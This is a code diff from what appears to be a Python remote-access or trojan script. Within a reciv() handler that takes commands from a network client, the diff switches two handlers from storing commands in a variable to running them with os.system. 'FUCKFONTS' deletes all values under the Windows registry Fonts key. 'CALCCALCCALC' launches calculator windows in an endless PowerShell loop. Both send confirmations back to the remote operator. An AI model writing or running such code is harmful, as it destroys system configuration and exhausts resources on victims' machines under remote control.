@@ -18,12 +18,12 @@ def reciv():
                 client.close()
                 server.close()
             if it == "FUCKFONTS":
-                commandum = ('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')
+                os.system('cmd /c "REG DELETE "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Fonts" /va /f"')
                 result = ("\nx#FUCKFONTS ACTIVATED#x\n")
                 result = result.encode()
                 client.send(result)
             if it == "CALCCALCCALC":
-                commandum = ('powershell /c "while ($true) {start calc.exe}"')
+                os.system('powershell /c "while ($true) {start calc.exe}"')
                 result = ("\nx#CALCCALCCALC ACTIVATED#x\n")
                 result = result.encode()
                 client.send(result)
